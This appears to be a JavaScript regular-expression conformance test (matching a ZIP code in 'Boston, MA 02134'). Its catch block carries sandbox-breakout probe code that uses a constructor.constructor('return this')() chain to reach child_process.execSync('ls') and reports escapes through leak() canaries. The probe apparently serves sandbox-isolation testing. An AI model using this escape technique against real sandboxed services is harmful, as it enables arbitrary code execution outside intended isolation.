try {
    var __string = 'Boston, MA 02134';
    var __matches = [
        '02134',
        '02134',
        undefined
    ];
    var __re = /([\d]{5})([-\ ]?[\d]{4})?$/;
    __re.lastIndex = __string.lastIndexOf('0');
    if (__string.match(__re).length !== 3) {
        $ERROR('#1: __string.match(__re).length=== 3. Actual: ' + __string.match(__re).length);
    }
    if (__string.match(__re).index !== __string.lastIndexOf('0')) {
        $ERROR('#2: __string.match(__re).index ===__string.lastIndexOf("0"). Actual: ' + __string.match(__re).index);
    }
    for (var mi = 0; mi < __matches.length; mi++) {
        if (__string.match(__re)[mi] !== __matches[mi]) {
            $ERROR('#3.' + mi + ': __string.match(__re)[' + mi + ']===__matches[' + mi + ']. Actual: ' + __string.match(__re)[mi]);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}